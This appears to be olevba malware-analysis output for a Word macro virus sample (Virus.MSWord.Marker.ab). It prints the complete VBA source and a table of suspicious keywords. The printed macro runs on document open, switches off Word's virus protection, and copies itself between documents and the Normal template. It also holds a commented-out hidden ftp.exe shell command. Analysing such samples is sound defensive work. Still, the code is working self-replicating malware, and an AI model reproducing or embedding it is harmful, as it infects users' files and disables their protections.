olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ab-3befdd80d2af9707e65de2e89ab9b14db426adc7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ab-3befdd80d2af9707e65de2e89ab9b14db426adc7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


'sathishkumar3/25/99 2:44:44 PMHP LaserJet 4L on \\KUMSOFT\PQ1ORACLEQA



Private Sub Document_Open()
On Error Resume Next

'DECLARATIONS

Dim sViralCode As String, nFreeFile As Integer
Dim oNormal As Object, oDocument As Object, sFileName As String
Dim rRange As Range

Const cIndicator = "XYZ"  ' CONSTANT TO FIND IF THE FILE IS ALREADY INFECTED OR NOT

    Options.VirusProtection = False 'SET VIRUS PROTECTION TO OFF MODE
    nFreeFile = FreeFile

    Randomize
    sFileName = "\XYZ" + Str(32767 * Rnd) + ".txt"
    
    Open CurDir + sFileName For Output As #nFreeFile
        Write #nFreeFile, ""
    Close #nFreeFile
    
    Set oDocument = ActiveDocument.VBProject.VBComponents.Item(1)
    Set oNormal = NormalTemplate.VBProject.VBComponents.Item(1)
    
    If (oNormal.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oDocument.CodeModule.Lines(1, oDocument.CodeModule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oNormal.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
        oNormal.CodeModule.AddFromString sViralCode
        
    End If

'    Shell "Command.com /c ftp.exe -n -s:" + CurDir + sFileName, vbHide
    
    If (oDocument.CodeModule.Find(cIndicator, 1, 1, 999, 999)) = False Then
        sViralCode = oNormal.CodeModule.Lines(1, oNormal.CodeModule.CountOfLines)
        ViralCode = ViralCode & Chr(10)
        oDocument.CodeModule.DeleteLines 1, oNormal.CodeModule.CountOfLines
        oDocument.CodeModule.AddFromString sViralCode
    End If
    
    ActiveDocument.Save
    NormalTemplate.Save
   
End Sub


' Virus Created By An Indian Citizen



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

